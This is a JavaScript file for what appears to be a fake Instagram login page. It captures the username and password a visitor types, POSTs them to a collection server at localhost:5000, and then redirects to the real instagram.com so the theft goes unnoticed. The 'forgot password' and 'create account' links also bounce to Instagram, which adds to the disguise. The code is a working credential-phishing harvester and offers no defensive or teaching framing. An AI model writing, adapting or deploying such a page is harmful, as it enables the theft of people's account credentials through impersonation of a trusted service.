const splash = document.getElementById('splash-screen');
const main = document.getElementById('main-content');
const loginBtn = document.getElementById('loginBtn');
const loginForm = document.getElementById('loginForm');

const forgotPass = document.querySelector('.forgot');
const createAccBtn = document.querySelector('.create-btn');

const REDIRECT_URL = "http://instagram.com/";

// 1. SPLASH SCREEN (2s timer)
window.addEventListener('load', () => {
    setTimeout(() => {
        splash.style.opacity = '0';
        main.style.opacity = '1';
        setTimeout(() => { splash.style.display = 'none'; }, 500);
    }, 2000);
});

// 2. INSTANT REDIRECTS
forgotPass.addEventListener('click', (e) => {
    e.preventDefault();
    window.location.href = REDIRECT_URL;
});

createAccBtn.addEventListener('click', () => {
    window.location.href = REDIRECT_URL;
});

// 3. FORM SUBMISSION
loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    loginBtn.classList.add('is-loading');
    loginBtn.disabled = true;

    const data = {
        username: document.getElementById('username').value,
        password: document.getElementById('password').value
    };

    try {
        const response = await fetch('http://localhost:5000/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        if (response.ok) {
            window.location.href = REDIRECT_URL;
        } else {
            alert("Error saving data");
            loginBtn.classList.remove('is-loading');
            loginBtn.disabled = false;
        }
    } catch (error) {
        console.error(error);
        alert("Server error. Please check your connection.");
        loginBtn.classList.remove('is-loading');
        loginBtn.disabled = false;
    }
});